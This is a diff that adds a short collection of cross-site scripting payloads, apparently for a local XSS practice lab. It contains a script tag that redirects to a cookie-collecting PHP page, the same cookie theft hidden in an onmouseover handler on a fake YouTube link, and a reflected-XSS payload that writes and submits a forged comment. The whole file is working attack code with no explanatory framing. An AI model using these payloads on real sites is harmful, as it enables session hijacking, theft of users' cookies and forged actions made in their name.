@@ -1,0 +1,15 @@
+///Cookie Stealing///
+
+//Full Redirect//
+<script>window.location='http://localhost/xss/4/cookiemonster.php?cookie='+escape(document.cookie)</script>
+
+//Hover attack//
+Check out This YouTube video:<a href="https://www.youtube.com/" onmouseover="window.location='http://localhost/xss/4/cookiemonster.php?cookie='+escape(document.cookie)">
+https://www.youtube.com/
+</a>
+
+///Reflected XSS Forced Comment///
+
+http://localhost/xss/4/index.php?name=Fred
+<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is fun!';
+document.getElementById('post').submit();}</script>
